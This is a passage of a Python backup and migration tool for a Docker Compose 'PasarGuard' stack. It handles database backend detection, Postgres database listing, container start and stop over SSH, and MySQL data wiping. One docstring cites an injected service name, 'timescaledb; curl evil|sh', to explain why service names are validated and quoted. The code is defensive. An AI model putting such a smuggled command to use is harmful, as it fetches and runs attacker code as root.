    services = [l.strip() for l in out.splitlines() if l.strip()] if ec == 0 else []
    svc = _pick_db_service(services, backend_type=backend_type)
    _DB_SERVICE_CACHE[key] = svc
    return svc

# Default DB service name to fall back to when no service list could be
# read. Indexed by backend_type so a mysql-only install gets "mysql" (which
# actually exists), not "timescaledb" (which doesn't, and would cause the
# script to try to docker exec into a non-existent service).
_DEFAULT_DB_SERVICE = {
    "postgresql":  "postgres",
    "timescaledb": "timescaledb",
    "mysql":       "mysql",
    "mariadb":     "mariadb",
    "sqlite":      None,        # SQLite has no service to wait for
}

def _pick_db_service(services, backend_type=None):
    """Pick the DB service name out of a list of compose services.
    Falls back to asking the user if it can't decide on its own.

    v4.2.1 — strips any non-service top-level keys that slipped through
    the parser (e.g. `services`, `name`, `version`). Without this, a buggy
    parser returning `['services']` would cause the script to try to
    exec into a non-existent service literally called 'services'.

    v4.2.2 — accepts `backend_type` so the keyword list and the user
    prompt both adapt. Previously the function hard-coded the
    PostgreSQL-flavored prompt "Which service is the PostgreSQL
    database?" even on a MySQL install, which (a) was misleading and
    (b) caused a real failure when the picked container was then
    `pg_isready`'d by wait_postgres_* — pg_isready doesn't exist in a
    mysql image, so the wait timed out and the whole restore aborted."""
    bt = (backend_type or "postgresql").lower()
    default_svc = _DEFAULT_DB_SERVICE.get(bt, "timescaledb") or "timescaledb"

    if not services:
        print_warning(f"Could not read docker-compose services — defaulting to '{default_svc}'.")
        return default_svc

    safe = [s for s in services if s not in _NON_SERVICE_KEYS and _SAFE_SERVICE_NAME_RE.match(s)]
    if not safe:
        print_warning(f"No valid service names in compose output — defaulting to '{default_svc}'.")
        return default_svc

    if len(safe) == 1:
        return safe[0]

    if bt in ("mysql", "mariadb"):
        keywords = ["mysql", "mariadb", "db", "database"]
        prompt_label = "MySQL/MariaDB"
        prompt_default = "mysql"
    else:
        keywords = ["timescaledb", "postgres", "postgresql", "pgsql", "db", "database"]
        prompt_label = "PostgreSQL"
        prompt_default = "timescaledb"

    candidates = [s for s in safe if any(k in s.lower() for k in keywords)]

    if len(candidates) == 1:
        return candidates[0]

    print_warning(f"Multiple candidate DB services found: {', '.join(candidates or safe)}")
    choice = input(
        f" {C.R2}> Which service is the {prompt_label} database? [{prompt_default}]: {C.RESET}"
    ).strip()
    return choice if choice in safe else (candidates[0] if candidates else safe[0])

def db_service_local(d=None):
    return _detect_db_service_local(d)

def db_service_ssh(ssh, d=None):
    return _detect_db_service_ssh(ssh, d)

# ── Multi-database discovery (v4.0) ───────────────────────────
_SYSTEM_DBS = ("postgres", "template0", "template1")

def _list_databases_local(svc, user=None, pwd=None):
    # v4.2.6 — accept the actual resolved DB user instead of hardcoding
    # 'pasarguard'. On any install with a custom Postgres user (via
    # SQLALCHEMY_DATABASE_URL or DB_USER in .env), the old hardcoded
    # '-U pasarguard' auth failed silently, fell back to a single
    # legacy 'pasarguard' database name, and pg_dump then tried to dump
    # a database that often didn't even exist — breaking multi-database
    # backup for exactly the installs that need it most.
    # v4.2.7 — also accept/forward the resolved password as PGPASSWORD.
    # Without it, any Postgres/TimescaleDB service that enforces password
    # auth (the default for the official postgres/timescaledb images)
    # rejected this psql call outright, so enumeration silently fell back
    # to the legacy single-database guess even when the real password was
    # known (mirrors the pg_dump/pg_dumpall fix in _backup_postgres_local).
    user = user or "pasarguard"
    pgflag = _pg_env_flag(pwd)
    query = ("SELECT datname FROM pg_database "
             "WHERE datistemplate=false AND datname NOT IN "
             "('postgres','template0','template1') ORDER BY datname;")
    ok_v, out, _ = local_shell(
        f"docker compose exec -T {pgflag}{shlex.quote(svc)} psql -U {shlex.quote(user)} -d postgres -tA -c {shlex.quote(query)}",
        cwd=PASARGUARD_DIR,
    )
    if not ok_v or not out:
        print_warning(f"Could not enumerate Pasarguard databases as user '{user}' — falling back to legacy 'pasarguard' only.")
        return ["pasarguard"]
    names = [l.strip() for l in out.splitlines() if l.strip()]
    if not names:
        print_warning("No user databases found — falling back to legacy 'pasarguard' only.")
        return ["pasarguard"]
    return names

def _list_databases_ssh(ssh, svc, user=None, pwd=None):
    user = user or "pasarguard"
    pgflag = _pg_env_flag(pwd)
    query = ("SELECT datname FROM pg_database "
             "WHERE datistemplate=false AND datname NOT IN "
             "('postgres','template0','template1') ORDER BY datname;")
    ec, out, _ = ssh_shell(
        ssh,
        f"cd {PASARGUARD_DIR} && docker compose exec -T {pgflag}{shlex.quote(svc)} psql -U {shlex.quote(user)} -d postgres -tA -c {shlex.quote(query)}",
    )
    if ec != 0 or not out:
        print_warning(f"Could not enumerate Pasarguard databases on remote host as user '{user}' — falling back to legacy 'pasarguard' only.")
        return ["pasarguard"]
    names = [l.strip() for l in out.splitlines() if l.strip()]
    if not names:
        print_warning("No user databases found on remote host — falling back to legacy 'pasarguard' only.")
        return ["pasarguard"]
    return names

def _ident(name):
    """Safely quote a PostgreSQL identifier for embedding in a SQL string.
    Doubles any embedded double-quotes, then wraps in double-quotes."""
    return '"' + name.replace('"', '""') + '"'

# ── PasarGuard backend detection (v4.1) ──────────────────────
SUPPORTED_BACKENDS = ("sqlite", "postgresql", "timescaledb", "mysql", "mariadb")

def _read_env_file(path):
    out = {}
    try:
        with open(path) as f:
            for raw in f:
                line = raw.strip()
                if not line or line.startswith("#"):
                    continue
                if "=" not in line:
                    continue
                k, v = line.split("=", 1)
                k = k.strip()
                v = v.strip()
                if len(v) >= 2 and v[0] == v[-1] and v[0] in ('"', "'"):
                    v = v[1:-1]
                out[k] = v
    except FileNotFoundError:
        pass
    return out

def _mask_secret(value):
    if not value:
        return ""
    if len(value) <= 4:
        return "****"
    return f"****{value[-4:]}"

def _parse_sqlalchemy_url(url):
    if not url:
        return (None, None, None, None, None, None)
    try:
        scheme_full, rest = url.split("://", 1)
    except ValueError:
        return (None, None, None, None, None, None)
    scheme = scheme_full.split("+", 1)[0].lower()

    if scheme == "sqlite":
        if rest.startswith("//"):
            rest = rest[1:]
        elif rest.startswith("/"):
            pass
        return (scheme, None, None, None, None, rest)

    user = password = host = port = dbname = None
    if "@" in rest:
        creds, rest = rest.split("@", 1)
        if ":" in creds:
            user, password = creds.split(":", 1)
        else:
            user = creds
    if "?" in rest:
        rest = rest.split("?", 1)[0]
    if "/" in rest:
        host_port, dbname = rest.split("/", 1)
    else:
        host_port, dbname = rest, ""
    if ":" in host_port:
        host, port_s = host_port.split(":", 1)
        try:
            port = int(port_s)
        except ValueError:
            port = None
    else:
        host = host_port
        port = None
    return (scheme, user, password, host, port, dbname)

def _compose_image_contains(svc_image, needle):
    if not svc_image:
        return False
    return needle.lower() in svc_image.lower()

def _list_compose_services_local(d=None):
    d = d or PASARGUARD_DIR
    ok_v, out, _ = local_shell("docker compose config 2>/dev/null", cwd=d)
    if not ok_v or not out:
        try:
            with open(os.path.join(d, "docker-compose.yml")) as f:
                out = f.read()
        except FileNotFoundError:
            return []
    return _parse_compose_services(out)

def _list_compose_services_ssh(ssh, d=None):
    d = d or PASARGUARD_DIR
    ec, out, _ = ssh_shell(ssh, f"cd {d} && docker compose config 2>/dev/null")
    if ec != 0 or not out:
        ec2, out2, _ = ssh_shell(ssh, f"cat {d}/docker-compose.yml 2>/dev/null")
        if ec2 != 0:
            return []
        out = out2
    return _parse_compose_services(out)

# Top-level keys that look like service names but aren't (would cause the
# script to try to exec into a non-existent "services" / "name" / "version"
# container if they leaked through a buggy parser). Defence in depth.
_NON_SERVICE_KEYS = frozenset({
    "services", "name", "version", "networks", "volumes",
    "configs", "secrets", "x-*",
})

def _parse_compose_services(yaml_text):
    """Parse `docker compose config` output (or raw docker-compose.yml) and
    return [(service_name, image_string), ...] for every service that has
    an image defined.

    v4.2.1 — the previous parser only matched top-level keys (no leading
    whitespace + ends with ':'), so on the canonical compose output

        services:
          timescaledb:
            image: timescale/timescaledb:latest
          pasarguard:
            image: ...

    it captured ('services', 'timescale/...') — i.e. it tried to exec into
    a service literally called `services` — and missed the real service
    names entirely. This parser walks the YAML by indentation: only keys
    indented under the `services:` block are treated as service names,
    and only `image:` lines indented under a service count as that
    service's image."""
    services = {}  # name -> image
    in_services_block = False
    current_service = None
    services_indent = None  # indent of `services:` itself

    for raw in yaml_text.splitlines():
        if not raw.strip() or raw.lstrip().startswith("#"):
            continue
        stripped = raw.lstrip()
        indent = len(raw) - len(stripped)

        # Top-level key detection. `services:` opens the block we care
        # about; any other top-level key closes it.
        if indent == 0:
            if stripped == "services:":
                in_services_block = True
                services_indent = 0
                current_service = None
                continue
            if in_services_block:
                # We've left the services block (e.g. hit `volumes:`,
                # `networks:`, etc).
                in_services_block = False
                current_service = None
                continue
            continue

        if not in_services_block:
            continue

        # We're inside the services: block. Lines at indent == 2 that end
        # with ':' are service names; their image: child defines the image.
        if (indent == 2 and stripped.endswith(":")
                and not stripped.startswith("-")
                and not stripped.startswith("&")  # YAML anchors
                and not stripped.startswith("*")):  # YAML aliases
            current_service = stripped[:-1].strip().strip("'\"")
            if current_service and current_service not in _NON_SERVICE_KEYS:
                services.setdefault(current_service, "")
            else:
                current_service = None  # ignore non-service keys just in case
            continue

        # We're inside a specific service — look for the image: line.
        if current_service and indent >= 4 and stripped.startswith("image:"):
            image = stripped[len("image:"):].strip()
            if len(image) >= 2 and image[0] == image[-1] and image[0] in ('"', "'"):
                image = image[1:-1]
            services[current_service] = image

    # Only return services that have an image (real running containers —
    # build-only / external services without `image:` can't be exec'd into).
    return [(name, img) for name, img in services.items() if img]

def _detect_backend_local():
    env = _read_env_file(os.path.join(PASARGUARD_DIR, ".env"))
    url = env.get("SQLALCHEMY_DATABASE_URL", "")
    scheme, user, pwd, host, port, dbname = _parse_sqlalchemy_url(url)
    services = _list_compose_services_local()
    return _resolve_backend(scheme, user, pwd, host, port, dbname, env, services)

def _detect_backend_ssh(ssh):
    ec, env_text, _ = ssh_shell(ssh, f"cat {PASARGUARD_DIR}/.env 2>/dev/null")
    env = {}
    if ec == 0 and env_text:
        for raw in env_text.splitlines():
            line = raw.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            k = k.strip()
            v = v.strip()
            if len(v) >= 2 and v[0] == v[-1] and v[0] in ('"', "'"):
                v = v[1:-1]
            env[k] = v
    url = env.get("SQLALCHEMY_DATABASE_URL", "")
    scheme, user, pwd, host, port, dbname = _parse_sqlalchemy_url(url)
    services = _list_compose_services_ssh(ssh)
    return _resolve_backend(scheme, user, pwd, host, port, dbname, env, services)

def _resolve_backend(scheme, user, pwd, host, port, dbname, env, services):
    db_type = None
    container = None

    if scheme == "sqlite":
        db_type = "sqlite"
        container = None
    elif scheme == "postgresql":
        is_ts = any(_compose_image_contains(img, "timescale") for _, img in services)
        db_type = "timescaledb" if is_ts else "postgresql"
        container = _pick_service_by_image(services,
            image_needles=("timescaledb", "timescale", "postgres", "postgresql", "pgsql"),
            name_needles=("timescaledb", "postgresql", "postgres", "pgsql", "db", "database"),
        )
    elif scheme in ("mysql", "mariadb"):
        is_mariadb = any(_compose_image_contains(img, "mariadb") for _, img in services)
        db_type = "mariadb" if is_mariadb else "mysql"
        container = _pick_service_by_image(services,
            image_needles=("mariadb", "mysql"),
            name_needles=("mariadb", "mysql", "db", "database"),
        )
    else:
        db_type = "postgresql"
        container = _pick_service_by_image(services,
            image_needles=("timescaledb", "postgres", "postgresql", "pgsql"),
            name_needles=("timescaledb", "postgres", "postgresql", "pgsql", "db", "database"),
        )

    if not user:   user   = env.get("DB_USER", "")
    if not pwd:    pwd    = env.get("DB_PASSWORD", "")
    if not dbname: dbname = env.get("DB_NAME", "pasarguard")
    if not host:   host   = "127.0.0.1"
    if not port:
        if db_type in ("postgresql", "timescaledb"):
            port = 5432
        elif db_type in ("mysql", "mariadb"):
            port = 3306
        else:
            port = 0

    sqlite_path = None
    if db_type == "sqlite" and dbname:
        sqlite_path = "/" + dbname

    return {
        "type":       db_type,
        "host":       host,
        "port":       port,
        "user":       user or "",
        "password":   pwd or "",
        "dbname":     dbname or "",
        "container":  container,
        "env":        env,
        "services":   services,
        "sqlite_path": sqlite_path,
    }

def _pick_service_by_image(services, image_needles=(), name_needles=()):
    """Pick the most likely DB service from a list of (name, image) tuples.
    Prefers exact image matches, then name-substring matches, then any service
    that looks like a database. Returns the service name or None.

    v4.2.1 — refuses to return a service name that doesn't match
    [A-Za-z0-9_.-]+. A malicious docker-compose.yml could otherwise carry
    a service name like `timescaledb; curl evil|sh` that would then be
    pasted unquoted into shell=True docker commands as root."""
    if not services:
        return None
    safe = [(n, i) for n, i in services if _SAFE_SERVICE_NAME_RE.match(n)]
    if not safe:
        return None
    if len(safe) == 1:
        return safe[0][0]
    for needle in image_needles:
        for name, img in safe:
            if img.lower() == needle.lower():
                return name
    for needle in image_needles:
        for name, img in safe:
            if needle.lower() in img.lower():
                return name
    for needle in name_needles:
        for name, _ in safe:
            if needle.lower() in name.lower():
                return name
    return safe[0][0]

# ── Docker compose helpers ────────────────────────────────────
def _running_ids_local(d):
    _, out, _ = local_shell("docker compose ps -q --status running", cwd=d)
    return [l for l in out.splitlines() if l.strip()]

def _running_ids_ssh(ssh, d):
    _, out, _ = ssh_shell(ssh, f"cd {d} && docker compose ps -q --status running 2>/dev/null || true")
    return [l for l in out.splitlines() if l.strip()]

def _expected_count_local(d, services):
    if services: return len(services)
    ok_v, out, _ = local_shell("docker compose config --services", cwd=d)
    return len([l for l in out.splitlines() if l.strip()]) if ok_v else 0

def _expected_count_ssh(ssh, d, services):
    if services: return len(services)
    ec, out, _ = ssh_shell(ssh, f"cd {d} && docker compose config --services 2>/dev/null")
    return len([l for l in out.splitlines() if l.strip()]) if ec == 0 else 0

def stop_compose_local(d, label):
    if not os.path.isdir(d) or not os.path.isfile(os.path.join(d, "docker-compose.yml")):
        print_warning(f"{label}: not found or missing compose file — skipping stop.")
        return True
    print_info(f"Stopping {label} containers...")
    for attempt in range(1, COMPOSE_STOP_RETRIES + 1):
        run_command(f"docker compose down --remove-orphans -t {COMPOSE_DOWN_TIMEOUT}", cwd=d)
        run_command("docker compose stop -t 10 2>/dev/null || true", cwd=d)
        run_command("docker compose rm -f 2>/dev/null || true", cwd=d)
        if not _running_ids_local(d):
            print_success(f"{label}: all containers stopped.")
            return True
        print_warning(f"{label}: still running (attempt {attempt}/{COMPOSE_STOP_RETRIES})...")
        time.sleep(2)
    print_error(f"{label}: could not stop all containers.")
    return False

def stop_compose_ssh(ssh, d, label):
    ec, _, _ = ssh_shell(ssh, f"test -d {d} && test -f {d}/docker-compose.yml")
    if ec != 0:
        print_warning(f"{label}: not found or missing compose file — skipping stop.")
        return True
    print_info(f"Stopping {label} containers...")
    for attempt in range(1, COMPOSE_STOP_RETRIES + 1):
        ssh_shell(ssh, f"cd {d} && docker compose down --remove-orphans -t {COMPOSE_DOWN_TIMEOUT}")
        ssh_shell(ssh, f"cd {d} && docker compose stop -t 10 2>/dev/null || true")
        ssh_shell(ssh, f"cd {d} && docker compose rm -f 2>/dev/null || true")
        if not _running_ids_ssh(ssh, d):
            print_success(f"{label}: all containers stopped.")
            return True
        print_warning(f"{label}: still running (attempt {attempt}/{COMPOSE_STOP_RETRIES})...")
        time.sleep(2)
    print_error(f"{label}: could not stop all containers.")
    return False

def wait_db_local(svc, backend_type=None):
    """Wait for a DB container to become ready, dispatching by backend type.

    v4.2.2 — renamed from wait_postgres_local and made backend-aware.
    Previously this always exec'd `pg_isready` into the picked container,
    which crashed on mysql/mariadb images (no such binary) and made the
    whole restore abort with 'mysql did not start'. Now picks the right
    readiness probe per backend:
      - postgresql / timescaledb → pg_isready -U pasarguard -d postgres
      - mysql / mariadb          → mysqladmin ping -uroot -h 127.0.0.1
      - sqlite                   → no service to wait for, return True
      - unknown                  → skip with a warning, return True
    """
    bt = (backend_type or "postgresql").lower()
    print_info(f"Waiting for {svc} ({bt}) to become ready...")
    deadline = time.time() + POSTGRES_READY_MAX_WAIT

    if bt in ("postgresql", "timescaledb"):
        cmd = (
            f"docker compose exec -T {shlex.quote(svc)} "
            f"pg_isready -U pasarguard -d postgres"
        )
    elif bt in ("mysql", "mariadb"):
        cmd = (
            f"docker compose exec -T {shlex.quote(svc)} "
            f"mysqladmin ping -h 127.0.0.1 -uroot 2>/dev/null"
        )
    elif bt == "sqlite":
        print_success("SQLite has no service to wait for — assuming ready.")
        return True
    else:
        print_warning(f"Unknown backend type {bt!r} — skipping readiness check.")
        return True

    while time.time() < deadline:
        ok_v, _, _ = local_shell(cmd, cwd=PASARGUARD_DIR)
        if ok_v:
            print_success("Database is ready.")
            return True
        time.sleep(POSTGRES_READY_INTERVAL)
    print_error("Database did not become ready in time.")
    return False


def wait_db_ssh(ssh, svc, backend_type=None):
    """SSH variant of wait_db_local — see wait_db_local for dispatch logic."""
    bt = (backend_type or "postgresql").lower()
    print_info(f"Waiting for {svc} ({bt}) to become ready...")
    deadline = time.time() + POSTGRES_READY_MAX_WAIT

    if bt in ("postgresql", "timescaledb"):
        cmd = (
            f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} "
            f"pg_isready -U pasarguard -d postgres"
        )
    elif bt in ("mysql", "mariadb"):
        cmd = (
            f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} "
            f"mysqladmin ping -h 127.0.0.1 -uroot 2>/dev/null"
        )
    elif bt == "sqlite":
        print_success("SQLite has no service to wait for — assuming ready.")
        return True
    else:
        print_warning(f"Unknown backend type {bt!r} — skipping readiness check.")
        return True

    while time.time() < deadline:
        ec, _, _ = ssh_shell(ssh, cmd)
        if ec == 0:
            print_success("Database is ready.")
            return True
        time.sleep(POSTGRES_READY_INTERVAL)
    print_error("Database did not become ready in time.")
    return False

# Back-compat shims — older callers (if any external scripts import this
# module) keep working. Internally we now always call wait_db_* directly.
def wait_postgres_local():
    return wait_db_local(db_service_local(), backend_type="postgresql")

def wait_postgres_ssh(ssh):
    return wait_db_ssh(ssh, db_service_ssh(ssh), backend_type="postgresql")

def start_compose_local(d, label, services=None, wait_db=False, backend_type=None):
    if not os.path.isdir(d) or not os.path.isfile(os.path.join(d, "docker-compose.yml")):
        print_error(f"{label}: compose project not found at {d}")
        return False
    # v4.2.1 — validate + quote each service individually before joining
    # (a malicious compose could otherwise yield service names with shell
    # metachars; the joined-then-quoted form would also be wrong because
    # shlex.quote wraps the whole space-joined string as one argument).
    safe_services = []
    for s in (services or []):
        try:
            safe_services.append(_validate_service_name(s))
        except ValueError as e:
            print_error(f"{label}: {e}")
            return False
    svc_q = " ".join(shlex.quote(s) for s in safe_services)
    print_info(f"Starting {label} containers{f' ({svc_q})' if svc_q else ''}...")
    if not run_command(f"docker compose up -d {svc_q}".strip(), cwd=d):
        print_error(f"{label}: docker compose up failed.")
        return False
    # v4.2.2 — wait_db is now backend-aware. The DB service to probe
    # is the first one in `services` (matches what workflow_transfer /
    # workflow_manual_restore pass in: services=[remote_db_svc]).
    if wait_db and safe_services:
        if not wait_db_local(safe_services[0], backend_type=backend_type):
            return False
    expected = _expected_count_local(d, services)
    if expected == 0 and not wait_db:
        print_warning(f"{label}: assuming startup succeeded.")
        return True
    deadline = time.time() + COMPOSE_UP_MAX_WAIT
    while time.time() < deadline:
        if len(_running_ids_local(d)) >= expected:
            print_success(f"{label}: containers running.")
            return True
        time.sleep(COMPOSE_UP_INTERVAL)
    print_error(f"{label}: startup verification failed.")
    return False

def start_compose_ssh(ssh, d, label, services=None, wait_db=False, backend_type=None):
    ec, _, _ = ssh_shell(ssh, f"test -d {d} && test -f {d}/docker-compose.yml")
    if ec != 0:
        print_error(f"{label}: compose project not found at {d}")
        return False
    # v4.2.1 — validate + quote each service individually before joining.
    safe_services = []
    for s in (services or []):
        try:
            safe_services.append(_validate_service_name(s))
        except ValueError as e:
            print_error(f"{label}: {e}")
            return False
    svc_q = " ".join(shlex.quote(s) for s in safe_services)
    print_info(f"Starting {label} containers{f' ({svc_q})' if svc_q else ''}...")
    ec, _, er = ssh_shell(ssh, f"cd {d} && docker compose up -d {svc_q}".strip())
    if ec != 0:
        print_error(f"{label}: docker compose up failed.")
        if er: print_error(er)
        return False
    # v4.2.2 — wait_db is now backend-aware (see wait_db_ssh for dispatch).
    if wait_db and safe_services:
        if not wait_db_ssh(ssh, safe_services[0], backend_type=backend_type):
            return False
    expected = _expected_count_ssh(ssh, d, services)
    if expected == 0 and not wait_db:
        print_warning(f"{label}: assuming startup succeeded.")
        return True
    deadline = time.time() + COMPOSE_UP_MAX_WAIT
    while time.time() < deadline:
        if len(_running_ids_ssh(ssh, d)) >= expected:
            print_success(f"{label}: containers running.")
            return True
        time.sleep(COMPOSE_UP_INTERVAL)
    print_error(f"{label}: startup verification failed.")
    return False

def clean_dirs_local(include_node=True):
    targets = [
        (PASARGUARD_DIR,      "Pasarguard config (/opt/pasarguard)"),
        (PASARGUARD_DATA_DIR, "Pasarguard data (/var/lib/pasarguard)"),
    ]
    if include_node:
        targets += [
            (PG_NODE_DIR,      "PG-Node config (/opt/pg-node)"),
            (PG_NODE_DATA_DIR, "PG-Node data (/var/lib/pg-node)"),
        ]
    print_info("Cleaning target directories...")
    for path, desc in targets:
        if not run_command(f"rm -rf {path} && mkdir -p {path}", quiet=True):
            print_error(f"Failed to clean {desc}")
            return False
    print_success("Target directories cleaned.")
    return True

def clean_dirs_ssh(ssh, include_node=True):
    targets = [
        (PASARGUARD_DIR,      "Pasarguard config"),
        (PASARGUARD_DATA_DIR, "Pasarguard data"),
    ]
    if include_node:
        targets += [
            (PG_NODE_DIR,      "PG-Node config"),
            (PG_NODE_DATA_DIR, "PG-Node data"),
        ]
    print_info("Cleaning target directories...")
    for path, desc in targets:
        ec, _, er = ssh_shell(ssh, f"rm -rf {path} && mkdir -p {path}")
        if ec != 0:
            print_error(f"Failed to clean {desc}")
            return False
    print_success("Target directories cleaned.")
    return True

# ── MySQL data-dir wipe (v4.2.3) ───────────────────────────────
# MySQL/MariaDB only honours MYSQL_ROOT_PASSWORD / MYSQL_PASSWORD from
# the container environment on FIRST initialisation. If the data
# directory already contains a database (i.e. it survived from a
# previous run on the destination host), MySQL keeps the OLD password
# and silently ignores the new one in .env — leading to "Access denied
# (1045)" errors during restore, even though the .env we just extracted
# has the right password.
#
# Docker's own `docker compose down -v` only removes Docker NAMED
# volumes. It does NOT remove bind mounts (host paths bind-mounted
# into the container). A typical PasarGuard install on Hetzner /
# Contabo / etc. bind-mounts /var/lib/mysql from /var/lib/mysql/<name>
# on the host, which survives `down -v` and leaves the OLD password
# intact. That's the root cause of the 1045 chain the user hit.
#
# The two functions below detect where MySQL stores its data (named
# volume OR bind mount) by parsing docker-compose.yml, and remove it
# explicitly BEFORE we start MySQL, so it re-inits cleanly with the
# credentials from the new .env.

def _parse_mysql_data_mount(compose_text, svc):
    """Find the data-dir mount for the MySQL/MariaDB service in a
    docker-compose.yml text. Returns (source, type) where type is
    'bind' or 'volume', or (None, None) if not found.

    Recognises these patterns inside the mysql service:
        - /host/path:/var/lib/mysql        (short-form bind mount)
        - vol_name:/var/lib/mysql          (short-form named volume)
        - type: volume / source: vol_name  (long-form)
    Both /var/lib/mysql and /var/lib/mariadb are accepted as the target."""
    if not compose_text:
        return None, None

    lines = compose_text.splitlines()
    in_services   = False
    in_target_svc = False
    in_volumes    = False
    vol_indent    = None
    long_vol      = {}  # type/source/target/etc. for long-form mount

    for raw in lines:
        stripped = raw.lstrip()
        if not stripped or stripped.startswith("#"):
            continue
        indent = len(raw) - len(stripped)

        # Top-level keys (indent 0).
        if indent == 0:
            if stripped == "services:":
                in_services = True
            elif in_services:
                in_services = False
            continue
        if not in_services:
            continue

        # Service name line (indent 2, ends with ':', not a list item).
        if (indent == 2 and stripped.endswith(":")
                and not stripped.startswith("-")
                and not stripped.startswith("&")
                and not stripped.startswith("*")):
            current_svc = stripped[:-1].strip().strip("'\"").strip()
            in_target_svc = (current_svc == svc)
            in_volumes = False
            long_vol = {}
            continue
        if not in_target_svc:
            continue

        # `volumes:` subsection opener.
        if indent >= 4 and stripped == "volumes:":
            in_volumes = True
            vol_indent = indent
            long_vol = {}
            continue

        # Leaving the volumes subsection when indentation decreases.
        if in_volumes and indent <= vol_indent:
            in_volumes = False
            long_vol = {}

        if not in_volumes:
            continue

        # Short-form list item: `- source:target[:mode]`
        if stripped.startswith("-"):
            mount = stripped.lstrip("- ").strip().strip('"').strip("'")
            if ":" in mount:
                src, tgt = mount.split(":", 1)
                tgt = tgt.strip()
                if tgt.rstrip("/") in ("/var/lib/mysql", "/var/lib/mariadb"):
                    src = src.strip()
                    if not src:
                        continue
                    if src.startswith("/") or src.startswith("."):
                        return src, "bind"
                    return src, "volume"
            continue

        # Long-form key (type, source, target, read_only, ...).
        if ":" in stripped:
            k, v = stripped.split(":", 1)
            long_vol[k.strip()] = v.strip().strip('"').strip("'")
            tgt = long_vol.get("target", "").rstrip("/")
            if tgt in ("/var/lib/mysql", "/var/lib/mariadb"):
                src = long_vol.get("source", "").strip()
                if not src:
                    continue
                mtype = long_vol.get("type", "volume").strip().lower()
                if mtype == "bind":
                    return src, "bind"
                return src, "volume"

    return None, None


def _wipe_mysql_data_remote(ssh, svc):
    """v4.2.3 — detect and remove MySQL data on the remote host so the
    container re-inits with the credentials from the new .env.

    Returns True on success (or when there's nothing to wipe), False if
    the wipe itself failed and we couldn't recover. We do NOT abort the
    whole transfer on failure — the existing restore code will try
    anyway and surface a precise 1045 error if the data really is
    stale, which is more informative than silently bailing here."""
    ec, compose_text, _ = ssh_shell(ssh,
        f"cat {shlex.quote(PASARGUARD_DIR)}/docker-compose.yml 2>/dev/null")
    if ec != 0 or not compose_text:
        ec, compose_text, _ = ssh_shell(ssh,
            f"cd {shlex.quote(PASARGUARD_DIR)} && docker compose config 2>/dev/null")

    source, mtype = _parse_mysql_data_mount(compose_text or "", svc)

    # Fallback: if compose parsing yielded nothing, look at any volume
    # whose name contains mysql/mariadb/pasarguard. Covers the case
    # where the compose file uses YAML anchors or `extends:` that the
    # parser can't fully resolve.
    if not source:
        ec, vols, _ = ssh_shell(ssh,
            "docker volume ls --format '{{.Name}}' 2>/dev/null | "
            "grep -iE 'mysql|mariadb|pasarguard' | head -1")
        if ec == 0 and vols.strip():
            source = vols.strip().splitlines()[0].strip()
            mtype = "volume"

    if not source:
        print_warning(
            f"Could not detect MySQL data mount for service {svc!r} on the remote."
        )
        print_warning(
            "If MySQL has stale data on a bind mount that survived `docker compose down -v`,"
        )
        print_warning(
            "restore may fail with 1045 'Access denied'. Wipe the host data dir manually if so."
        )
        return True

    if mtype == "bind":
        print_info(f"MySQL data is bind-mounted from {source!r}. Removing...")
        # Recreate the parent so MySQL can re-mount into an empty dir on
        # first start (otherwise mount may fail with 'directory not empty'
        # or similar on some filesystems).
        ec, _, err = ssh_shell(ssh,
            f"rm -rf {shlex.quote(source)} && mkdir -p {shlex.quote(source)}")
        if ec != 0:
            print_error(f"Could not wipe bind mount {source}: {(err or '').strip()}")
            return False
        print_success(f"Wiped MySQL data at {source} (bind mount).")

    elif mtype == "volume":
        print_info(f"MySQL data is on Docker volume {source!r}. Removing...")
        ec, _, err = ssh_shell(ssh, f"docker volume rm {shlex.quote(source)} 2>&1")
        if ec != 0:
            err_clean = (err or "").strip()
            if "in use" in err_clean.lower() or "being used" in err_clean.lower():
                print_warning(f"Volume {source!r} is still referenced; forcing removal...")
                ec2, _, err2 = ssh_shell(ssh,
                    f"docker volume rm -f {shlex.quote(source)} 2>&1")
                if ec2 != 0:
                    print_error(f"Could not remove volume {source}: {(err2 or '').strip()}")
                    return False
            else:
                print_error(f"Could not remove volume {source}: {err_clean}")
                return False
        print_success(f"Removed MySQL volume {source}.")
    else:
        print_warning(f"Unknown MySQL mount type {mtype!r}; skipping wipe.")
        return True

    return True


def _wipe_mysql_data_local(svc):
    """v4.2.3 — local counterpart of _wipe_mysql_data_remote (used by
    workflow_manual_restore when the script is being run on the same
    machine that hosts the destination stack)."""
    compose_path = os.path.join(PASARGUARD_DIR, "docker-compose.yml")
    compose_text = ""
    try:
        with open(compose_path) as f:
            compose_text = f.read()
    except FileNotFoundError:
        pass
    if not compose_text:
        ok_v, out, _ = local_shell("docker compose config 2>/dev/null", cwd=PASARGUARD_DIR)
        if ok_v:
            compose_text = out

    source, mtype = _parse_mysql_data_mount(compose_text or "", svc)

    if not source:
        ok_v, out, _ = local_shell(
            "docker volume ls --format '{{.Name}}' 2>/dev/null | "
            "grep -iE 'mysql|mariadb|pasarguard' | head -1",
            cwd=PASARGUARD_DIR)
        if ok_v and out.strip():
            source = out.strip().splitlines()[0].strip()
            mtype = "volume"

    if not source:
        print_warning(
            f"Could not detect MySQL data mount for service {svc!r} locally."
        )
        print_warning(
            "If MySQL has stale data on a bind mount that survived `docker compose down -v`,"
        )
        print_warning(
            "restore may fail with 1045 'Access denied'. Wipe the host data dir manually if so."
        )
        return True

    if mtype == "bind":
        print_info(f"MySQL data is bind-mounted from {source!r}. Removing...")
        rm = subprocess.run(["rm", "-rf", source], capture_output=True, text=True)
        if rm.returncode != 0:
            print_error(f"Could not wipe bind mount {source}: {rm.stderr.strip()}")
            return False
        os.makedirs(source, exist_ok=True)
        print_success(f"Wiped MySQL data at {source} (bind mount).")
    elif mtype == "volume":
        print_info(f"MySQL data is on Docker volume {source!r}. Removing...")
        rm = subprocess.run(["docker", "volume", "rm", source],
                             capture_output=True, text=True)
        if rm.returncode != 0:
            err_clean = (rm.stderr or "").strip()
            if "in use" in err_clean.lower() or "being used" in err_clean.lower():
                rm2 = subprocess.run(["docker", "volume", "rm", "-f", source],
                                      capture_output=True, text=True)
                if rm2.returncode != 0:
                    print_error(f"Could not remove volume {source}: {rm2.stderr.strip()}")
                    return False
            else:
                print_error(f"Could not remove volume {source}: {err_clean}")
                return False
